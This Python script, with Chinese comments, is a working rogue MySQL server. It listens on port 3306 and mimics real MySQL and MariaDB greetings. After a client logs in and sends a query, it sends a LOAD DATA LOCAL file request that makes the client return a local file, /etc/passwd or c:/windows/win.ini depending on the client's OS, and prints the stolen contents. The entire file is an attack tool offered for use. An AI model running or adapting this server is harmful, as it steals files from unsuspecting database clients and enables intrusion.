# coding: utf8
import socketserver
import random

dict = {
    "linux_filename": "/etc/passwd",
    "windows_filename": 'c:/windows/win.ini',
    'os_linux': b'\x05\x4c\x69\x6e\x75\x78',
    'os_windows': b'\x05\x57\x69\x6e',
    "mysql_native_password": b"\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00",
    "ok": b"\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00",
    "select": b"\x73\x65\x6c\x65\x63\x74"
}
# 使用多种类型的mysql server指纹
greet = [b'\x4a\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x36\x00\x04\x00\x00\x00\x33\x4e\x10\x34\x48\x4b\x2f\x13\x00\xff\xf7\xc0\x02\x00\xff\x81\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a\x07\x56\x66\x56\x6d\x4f\x5f\x70\x34\x6c\x2a\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
b"\x5b\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x2d\x31\x30\x2e\x33\x2e\x32\x32\x2d\x4d\x61\x72\x69\x61\x44\x42\x2d\x31\x00\x0f\x00\x00\x00\x39\x57\x29\x65\x42\x58\x74\x60\x00\xfe\xf7\x2d\x02\x00\xbf\x81\x15\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x63\x52\x50\x7b\x3a\x4e\x5a\x5a\x33\x2e\x2e\x3a\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"]

class MyTCPHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            # 服务端发送问候
            self.request.send(greet[random.randint(0, 1)])
            # 客户端发送密码验证
            data = self.request.recv(1024)
            if dict["mysql_native_password"] in data:
                filename = '/etc/passwd'
                # 基于数据包自动读取linux文件
                if dict['os_linux'] in data:
                    filename = dict['linux_filename']
                # 基于数据包自动读取windows文件
                if dict['os_windows'] in data:
                    filename = dict['windows_filename']
                # 发送用户名密码验证成功数据包
                self.request.send(dict["ok"])
                data = self.request.recv(1024)
                # 客户端请求select @@version，发送读取文件请求
                if dict["select"] in data:
                    print('[+]客户端发出select请求，发送读取文件数据包...')
                    data = chr(len(filename) + 1).encode() + bytes.fromhex('000001fb') + filename.encode()
                    self.request.send(data)
                    data = self.request.recv(10240)
                    print(data[4:].decode())
                else:
                    print("[-]客户端未发出select请求，无法正常请求读取文件！")

        except ConnectionResetError:
            print("[-]%s断开连接" % self.client_address[0])
        except Exception as e:
            print(str(e))
        finally:
            self.request.close()

    def setup(self):
        print("[+]%s 连接" % self.client_address[0])

    def finish(self):
        print("[-]%s 断开连接" % self.client_address[0])

if __name__ == "__main__":
    host, port = "0.0.0.0", 3306
    print("[+]rouge_mysql server is listening at port %s ..." % "".join([host, ":", str(port)]))
    try:
        server = socketserver.TCPServer((host, port), MyTCPHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("[+]rouge_mysql server exit!")
